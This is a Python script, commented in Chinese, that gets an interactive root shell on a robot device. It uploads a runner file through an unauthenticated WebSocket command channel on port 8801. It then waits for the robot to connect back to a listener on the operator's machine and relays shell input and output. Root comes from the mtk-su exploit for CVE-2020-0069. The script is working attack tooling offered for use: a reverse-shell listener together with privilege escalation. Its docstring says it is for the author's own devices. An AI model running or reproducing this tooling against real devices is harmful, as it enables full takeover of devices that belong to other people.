#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""root_shell.py — 稳定版交互式 root shell（8801 WS 通道，非 Lua 执行器，秒级进入）。
原理：8801 上传 sig_rootsh.py 并运行（cmd 8/10，零鉴权）→ 机器人反连 →
     runner 以前台进程起 mtk-su（CVE-2020-0069）→ 双向原样转发 = 交互式 root shell。

与 Lua cmd 365 通道的区别：不经过 SpeechActor 串行执行器，不存在卡死/超时问题，
今天实测该通道零失败。仅用于自有设备。

用法：
  python root_shell.py                  # 进入交互式 root shell（exit 或 Ctrl-D 退出）
  echo -e "id\\nuname -a\\nexit" | python root_shell.py    # 管道模式执行一批命令
"""
import argparse
import os
import socket
import sys
import threading
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
sys.path.insert(0, os.path.join(_HERE, "lib"))
import ws_cmd

LHOST = "192.168.8.186"
LPORT = 9701
HERE = os.path.dirname(os.path.abspath(__file__))


def upload_and_run(holder, lhost, lport):
    s = ws_cmd.ws_connect(ws_cmd.ROBOT, ws_cmd.WPORT)
    holder["ws"] = s
    raw = open(os.path.join(HERE, "sig_rootsh.py"), "rb").read().decode("utf-8")
    content = (raw.replace("__LHOST__", lhost)
                  .replace("__LPORT__", str(lport))).encode("utf-8")
    body = ws_cmd.pb_str(1, "sig_rootsh.py") + ws_cmd.pb_bytes(2, content)
    r = ws_cmd.transact(s, 8, body, wait=30)
    if not r:
        print("[-] upload 无响应")
        return False
    r = ws_cmd.transact(s, 10, ws_cmd.pb_str(1, "sig_rootsh.py"), wait=30)
    if r:
        d = ws_cmd.pb_decode(r["body"])
        print(f"[+] runner 已启动 resultCode={ws_cmd._n(d, 1)}")
    return True


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--lhost", default=LHOST, help="本机 IP（机器人回连目标）")
    ap.add_argument("--lport", type=int, default=LPORT)
    a = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", a.lport))
    srv.listen(1)
    srv.settimeout(90)
    print(f"[i] 监听 0.0.0.0:{a.lport}，上传并启动 runner…")

    holder = {}
    t = threading.Thread(target=upload_and_run, args=(holder, a.lhost, a.lport), daemon=True)
    t.start()

    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print("[-] 90s 内无回连")
        srv.close()
        return 3
    print(f"[+] 机器人已回连 {addr[0]}:{addr[1]}")

    conn.settimeout(30)
    banner = b""
    while b"ROOTSHELL-READY\n" not in banner:
        c = conn.recv(4096)
        if not c:
            print("[-] runner 未就绪")
            return 4
        banner += c
    sys.stdout.write(banner.replace(b"ROOTSHELL-READY\n", b"").decode("utf-8", "replace"))
    sys.stdout.flush()
    print("[*] 交互式 root shell（exit 或 Ctrl-D 退出；无提示符，直接敲命令）")

    conn.settimeout(None)
    stop_in = threading.Event()

    def pump_stdin():
        while not stop_in.is_set():
            line = sys.stdin.readline()
            if not line:
                stop_in.set()
                return
            try:
                conn.sendall(line.encode())
            except OSError:
                stop_in.set()
                return

    threading.Thread(target=pump_stdin, daemon=True).start()
    try:
        # stdin 未 EOF：全双工转发；EOF 后：进入 3s 空闲收尾窗口，等在途输出
        conn.settimeout(None)
        while not stop_in.is_set():
            try:
                data = conn.recv(65536)
            except OSError:
                break
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
        conn.settimeout(3.0)
        while True:
            try:
                data = conn.recv(65536)
            except (socket.timeout, OSError):
                break
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
    except KeyboardInterrupt:
        pass
    stop_in.set()

    try:
        conn.close()
    except OSError:
        pass
    srv.close()
    ws = holder.get("ws")
    if ws:
        try:
            ws_cmd.ws_send_frame(ws, 0x8, b"")
            ws.close()
        except OSError:
            pass
    print("\n[i] 已退出")
    return 0


if __name__ == "__main__":
    sys.exit(main())
